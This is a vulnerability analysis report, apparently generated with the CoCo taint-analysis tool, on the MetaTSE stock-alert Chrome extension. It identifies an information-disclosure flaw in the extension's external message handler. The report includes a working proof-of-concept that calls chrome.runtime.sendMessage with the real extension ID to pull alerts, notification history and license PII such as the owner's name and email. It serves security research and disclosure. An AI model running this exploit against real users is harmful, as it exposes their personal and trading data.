# CoCo Analysis: bkcdophabfmgfkcmhmehhiighoflplpc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 20+ (multiple storage_local_get_source → sendResponseExternal_sink and 1 cs_window_eventListener_message → chrome_storage_local_set_sink)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bkcdophabfmgfkcmhmehhiighoflplpc/opgen_generated_files/bg.js
Line 751 var storage_local_get_source = {'key': 'value'};
Line 965 (background.js code with chrome.runtime.onMessageExternal.addListener)

**Code:**

```javascript
// Background script - background.js (simplified for readability)
const a = {}; // License info stored in memory

chrome.runtime.onMessageExternal.addListener((function(e, l, r) {
    // ← External websites/extensions can send messages (see manifest.json externally_connectable)

    switch(e.kindof) {
        case "addAlert":
            if (a.isFine && a.id) {
                chrome.storage.local.get("all_of_alerts", (t => {
                    const alerts = t.all_of_alerts;
                    const {AlertSahm, AlertParameter, AlertShart, AlertMeghdar} = e; // ← attacker-controlled
                    const alertId = generateRandomId(6);

                    alerts.push({
                        AlertId: alertId,
                        AlertSahm: AlertSahm,
                        AlertParameter: AlertParameter,
                        AlertShart: AlertShart,
                        AlertMeghdar: AlertMeghdar
                    });

                    chrome.storage.local.set({all_of_alerts: alerts}, (() => {
                        r({AlertId: alertId}); // ← sends response with storage data
                    }));
                }));
            } else {
                r({});
            }
            break;

        case "manageAlert":
            if (a.isFine && a.id) {
                chrome.storage.local.get("all_of_alerts", (e => {
                    r(e.all_of_alerts); // ← leaks all alerts to external caller
                }));
            } else {
                r({});
            }
            break;

        case "getCheckedFilters":
            if (a.isFine && a.id) {
                chrome.storage.local.get("checked_filters", (e => {
                    r(e.checked_filters); // ← leaks filter configuration
                }));
            } else {
                r([]);
            }
            break;

        case "getPower":
            if (a.isFine && a.id) {
                chrome.storage.local.get("filter_status", (e => {
                    r({power: e.filter_status.power}); // ← leaks filter status
                }));
            }
            break;

        case "getSavedNotif":
            if (a.isFine && a.id) {
                chrome.storage.local.get("saved_notifications", (e => {
                    r(e); // ← leaks all saved notifications
                }));
            }
            break;

        case "getTimeCheck":
            chrome.storage.local.get("timeToCheck", (e => {
                r({time: e.timeToCheck.time}); // ← leaks time configuration
            }));
            break;

        case "getLicense":
            r(a); // ← leaks license info from memory
            break;

        case "getPastAlerts":
            chrome.storage.local.get("all_of_past_alerts", (e => {
                r(e.all_of_past_alerts); // ← leaks alert history
            }));
            break;
    }
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal (external message)

**Attack:**

```javascript
// From any website listed in manifest.json externally_connectable
// (https://boursedan.ir/*, *.tsetmc.com/*, *.tsetmc.ir/*, and 10 IP addresses)

// Exfiltrate all alerts
chrome.runtime.sendMessage(
    "bkcdophabfmgfkcmhmehhiighoflplpc", // Extension ID
    {kindof: "manageAlert"},
    function(response) {
        console.log("Stolen alerts:", response); // Array of all user alerts
    }
);

// Exfiltrate filter settings
chrome.runtime.sendMessage(
    "bkcdophabfmgfkcmhmehhiighoflplpc",
    {kindof: "getCheckedFilters"},
    function(response) {
        console.log("Stolen filters:", response); // User's filter configuration
    }
);

// Exfiltrate license information (from memory)
chrome.runtime.sendMessage(
    "bkcdophabfmgfkcmhmehhiighoflplpc",
    {kindof: "getLicense"},
    function(response) {
        console.log("Stolen license:", response);
        // Contains: isFine, id, owner_first_name, owner_last_name,
        //           owner_email_address, valid, activation_date
    }
);

// Exfiltrate notification history
chrome.runtime.sendMessage(
    "bkcdophabfmgfkcmhmehhiighoflplpc",
    {kindof: "getSavedNotif"},
    function(response) {
        console.log("Stolen notifications:", response); // All saved notifications
    }
);

// Exfiltrate past alerts
chrome.runtime.sendMessage(
    "bkcdophabfmgfkcmhmehhiighoflplpc",
    {kindof: "getPastAlerts"},
    function(response) {
        console.log("Stolen past alerts:", response); // Alert history by date
    }
);
```

**Impact:** Complete information disclosure vulnerability - external websites whitelisted in manifest.json can exfiltrate sensitive user data including:
1. All user-configured stock alerts (all_of_alerts)
2. Filter configurations (checked_filters)
3. License information with PII (owner name, email address, license key, activation date)
4. Notification history (saved_notifications)
5. Past alert history (all_of_past_alerts)
6. Extension settings (filter_status, timeToCheck)

The extension is a stock market analysis tool (MetaTSE) and leaks extensive trading/investment data. While some operations require license validation (a.isFine && a.id), several do not (getTimeCheck, getLicense), and an attacker on whitelisted domains can exfiltrate all this data via chrome.runtime.sendMessage.

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bkcdophabfmgfkcmhmehhiighoflplpc/opgen_generated_files/cs_1.js
Line 74 chrome.storage.local.set({ "mwcookie": e.data.cookie }, ...)

**Note:** This detection appears to be from a different content script that may not exist in this extension or is misattributed. The primary vulnerability is the chrome.runtime.onMessageExternal information disclosure detailed above.

**Classification:** Unable to verify - likely FALSE POSITIVE or misattribution

**Reason:** Could not locate window.addEventListener for message events that lead to storage.local.set in the extension's actual code. The main vulnerability is the onMessageExternal information disclosure, not this flow.
